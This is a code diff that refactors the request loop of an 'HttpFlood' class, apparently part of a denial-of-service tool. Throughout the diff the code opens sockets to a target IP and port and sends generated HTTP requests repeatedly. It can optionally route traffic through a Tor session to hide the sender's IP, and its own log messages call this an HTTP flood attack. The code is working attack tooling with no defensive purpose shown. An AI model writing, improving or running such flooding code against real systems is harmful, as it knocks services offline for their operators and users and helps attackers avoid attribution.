@@ -42,43 +42,44 @@ class HttpFlood:
         logging.info(f"HTTP Flood attack to {self.target_ip}:{self.target_port} finished")
 
     def send_request(self):
-      socket_manager = SocketManager()  # Create a new SocketManager instance for each thread
+        socket_manager = SocketManager()  # Create a new SocketManager instance for each thread
+        tor_session = self.tor_manager.get_tor_session() if self.use_tor else None
 
-      while self.is_running:
-        try:
-            if self.use_tor:
-                session = self.tor_manager.get_tor_session()
-                response = session.get("http://localhost:8000")
-                if response.status_code == 200:
-                    logging.debug("Tor connection established. Your IP is: " + response.json()['origin'])
+        while self.is_running:
+            try:
+                if self.use_tor and tor_session:
+                    response = tor_session.get("http://localhost:8000")
+                    if response.status_code == 200:
+                        logging.debug("Tor connection established. Your IP is: " + response.json()['origin'])
+                    else:
+                        logging.error("Failed to connect to Tor.")
+                        continue
+
+                socket_manager.connect(self.target_ip, self.target_port)
+                if socket_manager.sock:
+                    while self.is_running:
+                        try:
+                            http_request = self.http_request_generator.create_http_request()
+                            socket_manager.send(http_request)
+                            logging.debug(Fore.GREEN + f"Sent HTTP request: {http_request}")
+
+                            time.sleep(random.uniform(0.1, 1.0))
+                        except socket.timeout:
+                            logging.error(Fore.YELLOW + "Socket connection timed out")
+                        except socket.error as e:
+                            logging.error(Fore.RED + f"Socket error: {e}")
+                            break
+                        except Exception as e:
+                            logging.error(Fore.RED + f"Unexpected error: {e}")
+                            break
                 else:
-                    logging.error("Failed to connect to Tor.")
-                    continue
+                    logging.error(Fore.RED + "Skipping sending HTTP request due to connection failure")
 
-            socket_manager.connect(self.target_ip, self.target_port)
-            if socket_manager.sock:
-                while self.is_running:
-                    try:
-                        http_request = self.http_request_generator.create_http_request()
-                        socket_manager.send(http_request)
-                        logging.debug(Fore.GREEN + f"Sent HTTP request: {http_request}")
+            except Exception as e:
+                logging.error(Fore.RED + f"Unexpected error during connection setup: {e}")
+            finally:
+                socket_manager.close()  # Ensure to close the socket after use
 
-                        time.sleep(random.uniform(0.1, 1.0))
-                    except socket.timeout:
-                        logging.error(Fore.YELLOW + "Socket connection timed out")
-                    except socket.error as e:
-                        logging.error(Fore.RED + f"Socket error: {e}")
-                        break
-                    except Exception as e:
-                        logging.error(Fore.RED + f"Unexpected error: {e}")
-                        break
-            else:
-                logging.error(Fore.RED + "Skipping sending HTTP request due to connection failure")
-
-        except Exception as e:
-            logging.error(Fore.RED + f"Unexpected error during connection setup: {e}")
-        finally:
-            socket_manager.close()  # Ensure to close the socket after use
-            
     def stop_attack(self):
         self.is_running = False
+
